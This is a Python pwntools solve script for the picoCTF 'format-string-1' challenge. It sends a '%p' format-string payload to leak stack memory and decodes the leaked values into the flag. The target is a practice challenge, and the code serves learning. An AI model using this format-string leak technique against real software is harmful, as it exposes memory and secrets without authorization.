#!/usr/bin/env python3

def add_to_flag(flag, blist):
    for i in range(2, len(blist[2:])+2, 2):
        num = blist[i] + blist[(i+1)]
        flag += chr(int(num, 16))
    return flag

from pwn import *

context.binary = binary = ELF("format-string-1")
#p = process()
#p = gdb.debug("./format-string-1","break *(main)")
#p = remote("mimas.picoctf.net", "PORT")

p.recvuntil(b"\n")
p.sendline(b"%p|"*(0x12))
d = p.recvline()

# this is just pretty print, don't try to read this its quick and very dirty
f = d.split(b": ")
m = f[1].split(b"|")
decoded = []
loc = start = 0xd
while(loc-start < 5):
    decoded.append(m[loc].decode("utf-8"))
    loc = loc+1
flag = ""
for i in decoded[::-1]:
    flag = add_to_flag(flag, i)

print("FLAG: " + flag[::-1])
